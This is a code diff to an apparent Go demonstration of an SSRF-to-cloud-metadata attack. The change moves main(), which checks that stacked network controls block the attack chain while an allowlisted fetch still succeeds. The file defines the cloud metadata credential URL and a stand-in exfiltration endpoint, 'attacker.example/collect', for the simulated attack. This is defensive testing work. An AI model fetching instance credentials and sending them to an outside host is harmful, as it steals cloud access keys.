@@ -28,6 +28,21 @@ import (
 	"github.com/t0ul/emaildrop/pkg/netpolicy"
 )
 
+func main() {
+	undef := trifectaCompletesUndefended()
+	def := stackSeversTheChain()
+	legit := legitFetchStillWorks()
+	fmt.Println()
+	if undef && def && legit {
+		fmt.Println("attack blocked (the receipt): the SSRF-to-metadata chain completes with no controls, every leg is severed once the three controls are stacked, and a legitimate allowlisted fetch still goes through")
+	} else {
+		fmt.Println("a control did not hold")
+		os.Exit(1)
+	}
+}
+
+// ---- the metadata service, and what goes out ----
+
 const (
 	imdsURL    = "http://169.254.169.254/latest/meta-data/iam/security-credentials/agent-role"
 	exfilURL   = "http://attacker.example/collect"
@@ -156,22 +171,11 @@ func legitFetchStillWorks() bool {
 	return err == nil
 }
 
+// ---- helpers ----
+
 func b2i(b bool) int {
 	if b {
 		return 1
 	}
 	return 0
-}
-
-func main() {
-	undef := trifectaCompletesUndefended()
-	def := stackSeversTheChain()
-	legit := legitFetchStillWorks()
-	fmt.Println()
-	if undef && def && legit {
-		fmt.Println("attack blocked (the receipt): the SSRF-to-metadata chain completes with no controls, every leg is severed once the three controls are stacked, and a legitimate allowlisted fetch still goes through")
-	} else {
-		fmt.Println("a control did not hold")
-		os.Exit(1)
-	}
 }
